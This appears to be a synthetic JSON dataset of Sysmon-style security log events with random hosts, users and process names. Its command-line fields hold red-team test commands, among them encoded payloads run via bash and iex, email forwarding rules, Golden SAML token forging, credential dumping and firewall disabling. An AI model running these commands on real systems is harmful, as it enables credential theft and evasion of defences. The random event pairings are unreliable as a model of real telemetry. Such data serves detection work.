        "SourceProcessID": 1791,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\maybe..exe",
        "DestinationProcessID": 2917,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\little..dll",
        "UtcTime": "2024-05-17T01:36:51.878619Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-51.shaw-boyd.com",
        "User": "kwilliams",
        "ProcessID": 5430,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"echo 0> #{log_path}\\n\",",
        "LogonID": 272225,
        "LogonGuid": "43df53a2-d341-4174-95f2-0d9a34ceec2b",
        "SourceProcessID": 1379,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\more..dll",
        "DestinationProcessID": 8910,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\eye..dll",
        "UtcTime": "2024-05-17T01:36:51.878619Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-84.smith.biz",
        "User": "calexander",
        "ProcessID": 9910,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"New-Item -Path #{teamviewer_log_file} -Force | Out-Null\\nRemove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore\\n\",",
        "LogonID": 829784,
        "LogonGuid": "9fbc6e17-9a80-468f-915a-2c1331ed68ae",
        "SourceProcessID": 6463,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\will..exe",
        "DestinationProcessID": 2109,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\let..exe",
        "UtcTime": "2024-05-17T01:36:51.878619Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-47.daniel.com",
        "User": "kallen",
        "ProcessID": 4127,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \\nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\\n(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = \\\"CommunitySupported\\\"})\\nDisconnect-VIServer -Confirm:$false\\n\",",
        "LogonID": 924540,
        "LogonGuid": "ca9aba47-58a6-4d13-8ecc-502c512a9f48",
        "SourceProcessID": 7176,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\reason..dll",
        "DestinationProcessID": 2341,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\rest..exe",
        "UtcTime": "2024-05-17T01:36:51.878619Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-22.sanders.com",
        "User": "dominique88",
        "ProcessID": 4994,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"[ \\\"$(uname)\\\" = 'FreeBSD' ] && encodecmd=\\\"b64encode -r -\\\" && decodecmd=\\\"b64decode -r\\\" || encodecmd=\\\"base64 -w 0\\\" && decodecmd=\\\"base64 -d\\\"\\nART=$(echo -n \\\"id\\\" | $encodecmd)\\necho \\\"\\\\$ART=$ART\\\"\\necho -n \\\"$ART\\\" | $decodecmd |/bin/bash\\nunset ART\\n\",",
        "LogonID": 691445,
        "LogonGuid": "c4eff140-1bce-41a7-95f6-bee286d6314f",
        "SourceProcessID": 1296,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\can..dll",
        "DestinationProcessID": 9970,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\hot..exe",
        "UtcTime": "2024-05-17T01:36:51.879619Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-45.davis.biz",
        "User": "jacquelinemeyers",
        "ProcessID": 6432,
        "ProcessName": "nc.exe",
        "CommandLine": "\"sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\\n\",",
        "LogonID": 339980,
        "LogonGuid": "d804d1d9-0cbb-4c6b-89bd-72b02956d564",
        "SourceProcessID": 7522,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\professional..exe",
        "DestinationProcessID": 1957,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\process..exe",
        "UtcTime": "2024-05-17T01:36:51.879619Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-87.clark-cardenas.com",
        "User": "reynoldschloe",
        "ProcessID": 8778,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"New-Item -Path \\\"#{output_path}\\\" -ItemType Directory > $null\\n& \\\"#{sharphound_path}\\\" -d \\\"#{domain}\\\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \\\"#{output_path}\\\"\\n\",",
        "LogonID": 834817,
        "LogonGuid": "da972b31-816b-4a75-a2cf-a6638dac5381",
        "SourceProcessID": 3450,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\determine..dll",
        "DestinationProcessID": 6291,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\new..exe",
        "UtcTime": "2024-05-17T01:36:51.879619Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-97.kennedy-smith.com",
        "User": "wellsdanny",
        "ProcessID": 1518,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Get-ItemProperty HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\\nGet-ItemProperty HKLM:\\\\Software\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\\n\",",
        "LogonID": 533974,
        "LogonGuid": "869b26a9-95ef-437f-8b86-37dc1978b2eb",
        "SourceProcessID": 3399,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\executive..exe",
        "DestinationProcessID": 2241,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\party..exe",
        "UtcTime": "2024-05-17T01:36:51.879619Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-60.smith-richardson.net",
        "User": "jmarshall",
        "ProcessID": 1994,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\\n\",",
        "LogonID": 510063,
        "LogonGuid": "6963fdc5-0054-4d7d-8c6d-f667c89ed42c",
        "SourceProcessID": 8863,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\term..exe",
        "DestinationProcessID": 7011,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\author..dll",
        "UtcTime": "2024-05-17T01:36:51.880621Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-93.moore.com",
        "User": "herringsuzanne",
        "ProcessID": 8439,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"# Encoded payload in next command is the following \\\"Set-Content -path \\\"$env:SystemRoot/Temp/art-marker.txt\\\" -value \\\"Hello from the Atomic Red Team\\\"\\\"\\nreg.exe add \\\"HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\AtomicRedTeam\\\" /v ART /t REG_SZ /d \\\"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\\\" /f\\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\\\Software\\\\Classes\\\\AtomicRedTeam').ART)))\\n\",",
        "LogonID": 677055,
        "LogonGuid": "c01bd8df-e9d0-43d0-b683-900a3adb9bad",
        "SourceProcessID": 8458,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\six..exe",
        "DestinationProcessID": 4128,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\clearly..dll",
        "UtcTime": "2024-05-17T01:36:51.880621Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-38.crosby-ruiz.biz",
        "User": "qturner",
        "ProcessID": 8830,
        "ProcessName": "nc.exe",
        "CommandLine": "\"7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path}\\n\",",
        "LogonID": 979293,
        "LogonGuid": "cdfc6734-7f40-41fe-8eb6-9b1e4d22c03c",
        "SourceProcessID": 1997,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\affect..dll",
        "DestinationProcessID": 8987,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\increase..exe",
        "UtcTime": "2024-05-17T01:36:51.880621Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-20.scott-lewis.biz",
        "User": "meghan62",
        "ProcessID": 2614,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$secure_pwd = \\\"#{password}\\\" | ConvertTo-SecureString -AsPlainText -Force\\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $secure_pwd\\nConnect-ExchangeOnline -Credential $creds\\nNew-InboxRule -Name \\\"#{rule_name}\\\" -ForwardTo \\\"#{forwarding_email}\\\"\\n\",",
        "LogonID": 680809,
        "LogonGuid": "90513740-d85a-4d55-b134-83f4876b3187",
        "SourceProcessID": 2667,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\focus..dll",
        "DestinationProcessID": 4205,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\realize..exe",
        "UtcTime": "2024-05-17T01:36:51.881619Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-68.johnston.com",
        "User": "melissagomez",
        "ProcessID": 5367,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add HKCU\\\\Software\\\\AppDataLow\\\\Software\\\\Microsoft\\\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f\\n\",",
        "LogonID": 400009,
        "LogonGuid": "e3910f8b-4320-4177-a0bd-71d101b9c18d",
        "SourceProcessID": 8333,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\sense..dll",
        "DestinationProcessID": 6196,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\him..dll",
        "UtcTime": "2024-05-17T01:36:51.881619Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-69.lopez.com",
        "User": "alyssa07",
        "ProcessID": 6194,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"echo \\\"dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\\\\nobjectClass: person\\\\ncn: Atomic User\\\\nsn: User\\\" > tempadmin.ldif\\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\\n\",",
        "LogonID": 605472,
        "LogonGuid": "fed79370-e86d-4c7c-afc1-0d0d33590474",
        "SourceProcessID": 5152,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\hair..exe",
        "DestinationProcessID": 3694,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\expert..exe",
        "UtcTime": "2024-05-17T01:36:51.881619Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-12.aguilar.com",
        "User": "coltonscott",
        "ProcessID": 8000,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\\\\..\\\\atomics\\\\T1562.004\\\\src\\\\esxi_disable_firewall.txt\\n\",",
        "LogonID": 317965,
        "LogonGuid": "b95d6d04-69f4-42b3-b4a6-1737c4ccdaf9",
        "SourceProcessID": 8384,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\explain..exe",
        "DestinationProcessID": 4703,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\size..dll",
        "UtcTime": "2024-05-17T01:36:51.882619Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-69.brown.org",
        "User": "wolfedward",
        "ProcessID": 7468,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add \\\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\" /v \\\"MaxConnectionsPerServer\\\" /t REG_DWORD /d 10 /f\\nreg add \\\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\" /v \\\"MaxConnectionsPer1_0Server\\\" /t REG_DWORD /d 10 /f\\n\",",
        "LogonID": 863852,
        "LogonGuid": "27576793-9d7e-46bb-9127-157fbab1e755",
        "SourceProcessID": 7407,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\wife..dll",
        "DestinationProcessID": 5394,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\student..dll",
        "UtcTime": "2024-05-17T01:36:51.882619Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-10.cox-ortiz.com",
        "User": "ledwards",
        "ProcessID": 6598,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f\\nnetsh advfirewall firewall add rule name=\\\"RDPPORTLatest-TCP-In\\\" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}\\n\",",
        "LogonID": 284034,
        "LogonGuid": "9792b292-ebbf-4aeb-b740-becd15b6a6c9",
        "SourceProcessID": 4728,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\make..exe",
        "DestinationProcessID": 8496,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\claim..dll",
        "UtcTime": "2024-05-17T01:36:51.882619Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-14.fischer.com",
        "User": "hbooth",
        "ProcessID": 8690,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\\nreg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\DisallowRun /f /t REG_SZ /v art1 /d \\\"regedit.exe\\\"\\nreg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\DisallowRun /f /t REG_SZ /v art2 /d \\\"cmd.exe\\\"\\n\",",
        "LogonID": 271421,
        "LogonGuid": "48be77ce-0678-46b3-82e1-7143c3930284",
        "SourceProcessID": 1382,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\child..dll",
        "DestinationProcessID": 4583,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\often..exe",
        "UtcTime": "2024-05-17T01:36:51.882619Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-92.arias.com",
        "User": "ashley56",
        "ProcessID": 4765,
        "ProcessName": "malware.exe",
        "CommandLine": "\"PowerShell -version 2 -command '#{v2_command}'\",",
        "LogonID": 970909,
        "LogonGuid": "35c85ce5-ffb0-46d7-83c2-1084b8d48f40",
        "SourceProcessID": 1113,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\shake..exe",
        "DestinationProcessID": 6246,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\though..dll",
        "UtcTime": "2024-05-17T01:36:51.883619Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-25.fowler.info",
        "User": "bergtyler",
        "ProcessID": 8898,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Import-Module AADInternals -Force\\n$saml = New-AADIntSAMLToken -ImmutableID \\\"#{immutable_id}\\\" -PfxFileName \\\"#{certificate_path}\\\" -Issuer \\\"#{issuer_uri}\\\"\\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\\nif ($conn) { Write-Host \\\"`nSuccessfully connected as $($conn.User)\\\" } else { Write-Host \\\"`nThe connection failed\\\" }\\nWrite-Host \\\"End of Golden SAML\\\"\\n\",",
        "LogonID": 918091,
        "LogonGuid": "20f8f3cf-cfd5-4e57-8a3d-280a5085900f",
        "SourceProcessID": 8256,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\black..dll",
        "DestinationProcessID": 3461,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\deal..dll",
        "UtcTime": "2024-05-17T01:36:51.883619Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-96.williams.net",
        "User": "mannmichael",
        "ProcessID": 3526,
        "ProcessName": "malware.exe",
        "CommandLine": "\"export AWS_REGION=#{aws_region}\\ncd #{stratus_path}\\necho \\\"Stratus: Start Warmup.\\\"\\n./stratus warmup aws.discovery.ec2-enumerate-from-instance\\necho \\\"Stratus: Start Detonate.\\\"\\n./stratus detonate aws.discovery.ec2-enumerate-from-instance\\n\",",
        "LogonID": 271486,
        "LogonGuid": "e48b6be7-bba2-4d96-97a8-13b75ecaf6c5",
        "SourceProcessID": 9861,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\name..exe",
        "DestinationProcessID": 1839,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\machine..exe",
        "UtcTime": "2024-05-17T01:36:51.883619Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-99.guzman.com",
        "User": "lawrencematthew",
        "ProcessID": 3062,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Write-Host \\\"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\\\" -fore green\\nImport-Module \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PowerDump.ps1\\\"\\nInvoke-PowerDump\",",
        "LogonID": 958441,
        "LogonGuid": "17848b07-0245-4ada-a45e-ba041560a7e9",
        "SourceProcessID": 1768,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\mean..dll",
        "DestinationProcessID": 2352,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\just..dll",
        "UtcTime": "2024-05-17T01:36:51.883619Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-92.rogers-moreno.net",
        "User": "johnrice",
        "ProcessID": 4666,
        "ProcessName": "nc.exe",
        "CommandLine": "\"systeminfo\\nreg query HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum\\n\",",
        "LogonID": 849070,
        "LogonGuid": "f904bc45-0828-413a-8ddb-cfcf4800e804",
        "SourceProcessID": 5048,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\part..dll",
        "DestinationProcessID": 1010,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\run..dll",
        "UtcTime": "2024-05-17T01:36:51.884620Z"
    },
